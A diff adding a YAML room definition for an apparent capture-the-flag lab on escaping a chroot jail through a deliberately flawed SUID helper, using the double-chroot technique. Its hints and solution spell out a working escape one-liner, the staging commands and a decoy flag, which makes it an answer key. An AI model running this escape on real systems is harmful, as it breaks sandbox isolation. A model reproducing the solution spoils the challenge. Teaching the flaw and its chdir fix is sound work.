@@ -1,0 +1,101 @@
+apiVersion: openrange.io/v1
+kind: Room
+metadata:
+  slug: namespace-escape-plan
+  title: 'Namespace Escape Plan'
+  version: 1.0.0
+  difficulty: hard
+  points: 300
+  estimated_minutes: 50
+  tags: [containers, chroot, sandbox-escape, linux]
+spec:
+  track: linux-networking
+  type: challenge
+  summary: >-
+    Your session on this lab box starts inside a chroot sandbox at
+    /jail, courtesy of an elevated helper that also exposes an
+    administrative chroot subcommand. The helper forgets one of the
+    two rules every sandbox builder must keep: after chroot(), move
+    the working directory under the new root. You will confirm the
+    boundary, stage a minimal toolkit inside a second chroot, and use
+    the classic double-chroot technique to climb back to the real
+    filesystem where the actual flag waits.
+  objectives:
+    - 'Recognize a chroot boundary from the filesystem you can and cannot see.'
+    - 'Apply the classic double-chroot escape: chroot into a subdirectory, then use the stranded working directory to reach the real root.'
+    - 'Explain why chdir("/") immediately after chroot() closes this escape, and why untrusted access to privileged chroot helpers defeats sandboxes entirely.'
+  prerequisites: []
+  scope:
+    allowed_targets:
+      - 'ssh://target:22'
+    forbidden: [control-plane, other-labs, internet, host]
+  safety:
+    simulated_only: true
+    no_real_malware: true
+    reviewer_notes: >-
+      sshd needs setuid and DAC overrides for privilege separation and
+      the room's core mechanic needs CAP_SYS_CHROOT, which the elevated
+      profile grants; sessions run as unprivileged learner (uid 1000).
+      The SUID jailctl helper is purpose-built for this lesson: it
+      plants a setuid-root stub of itself inside each new root it
+      enters so the second chroot of the classic escape can regain the
+      capability, because plain execs shed it. The container namespace
+      is real isolation and stays intact throughout: the escape crosses
+      a chroot boundary inside the container only, never the container
+      edge. Disposable Debian container.
+  target:
+    privilege_profile: elevated
+    build_context: ./target
+    ports: [22]
+    healthcheck:
+      tcp_port: 22
+    flag_delivery: env
+    flag_env: ROOM_FLAG
+  workstation: terminal
+  tasks:
+    - id: escape-the-jail
+      title: 'Break out with the double-chroot classic'
+      prompt: >-
+        SSH in as learner and notice your view of the filesystem stops
+        at /jail; a flag file sits right there, but it is not the real
+        one. Using the helper documented in the message of the day,
+        stage busybox inside a fresh directory, have the helper chroot
+        into that directory, climb upward through the stranded working
+        directory, then chroot onto the dot you land on. From outside
+        the sandbox read /flag.txt on the real root and submit that
+        FLAG value.
+      points: 300
+      hints:
+        - cost: 0
+          text: 'The motd documents the helper: jailctl chroot NEWROOT [COMMAND...] crosses into NEWROOT but leaves its working directory wherever it was, planting an elevated stub of itself inside the new root so a follow-up step still works. That stranded cwd is the entire trick.'
+        - cost: 10
+          text: 'Stage tools first: mkdir /tmp/esc, then cp /bin/busybox into it. Executables must exist inside the new root for exec to find them afterwards; the helper stub lands there automatically as /.jt.'
+        - cost: 25
+          text: "One line does it all from inside the jail: mkdir -p /tmp/esc && cp /bin/busybox /tmp/esc/busybox && /usr/local/bin/jailctl chroot /tmp/esc /busybox sh -c 'cd ../../.. && /.jt chroot . /bin/cat /flag.txt'. The climb reaches the real root and the stub's second chroot lands on it, so cat reads the real /flag.txt."
+      solution: |
+        1. SSH in as learner (password learner). `ls /` shows the jail's
+           contents only, and `cat /flag.txt` returns the decoy value
+           FLAG{JAILDEC0YCOPY0000000}, proof you are behind a chroot.
+        2. Stage a toolkit inside a new directory (once the root changes,
+           exec resolves every path against it, so your tools must be
+           inside):
+           mkdir -p /tmp/esc
+           cp /bin/busybox /tmp/esc/busybox
+        3. First chroot of the classic pair:
+           /usr/local/bin/jailctl chroot /tmp/esc /busybox sh -c 'cd ../../.. && pwd && ls'
+           The process now has /jail/tmp/esc as its root while its cwd
+           remains /home/learner, which lies OUTSIDE the new root,
+           because jailctl never calls chdir("/") after chroot().
+           The listing that follows shows the real filesystem.
+        4. Finish the pair from that stranded cwd. Three or four `..`
+           hops reach the real filesystem root; the helper's planted
+           stub (/.jt) then performs the second chroot onto "." and
+           swaps the sandbox for the real thing:
+           ... sh -c 'cd ../../.. && /.jt chroot . /bin/cat /flag.txt'
+           The final cat resolves against the real root and opens the
+           real /flag.txt.
+        5. Submit the FLAG value printed by that last cat. It differs
+           from the decoy you saw in step 1; always verify which side
+           of a boundary your evidence came from.
+      validator:
+        type: per_session_flag
